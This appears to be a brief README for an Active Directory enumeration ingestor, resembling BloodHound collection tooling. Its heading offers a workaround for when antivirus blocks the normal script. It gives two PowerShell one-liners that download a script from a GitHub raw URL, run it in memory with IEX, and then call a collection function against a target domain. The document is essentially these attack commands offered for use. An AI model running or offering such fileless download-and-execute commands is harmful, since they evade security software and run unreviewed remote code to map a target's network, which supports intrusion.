## Sometimes AV will block the normal script, just try this command
### Run this script with

```
iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/f3ci/custom-ingestor/master/2.ps1");lol -CollectionMethod All -Domain target.com
```
OR
```
$a = [System.Net.WebRequest]::Create('https://raw.githubusercontent.com/f3ci/custom-ingestor/master/2.ps1');$b=$a.GetResponse();$c=$b.GetResponseStream();$d=[System.IO.StreamReader]::new($c);$content=$d.ReadToEnd();IEX($content);lol -CollectionMethod All -Domain target.com
```
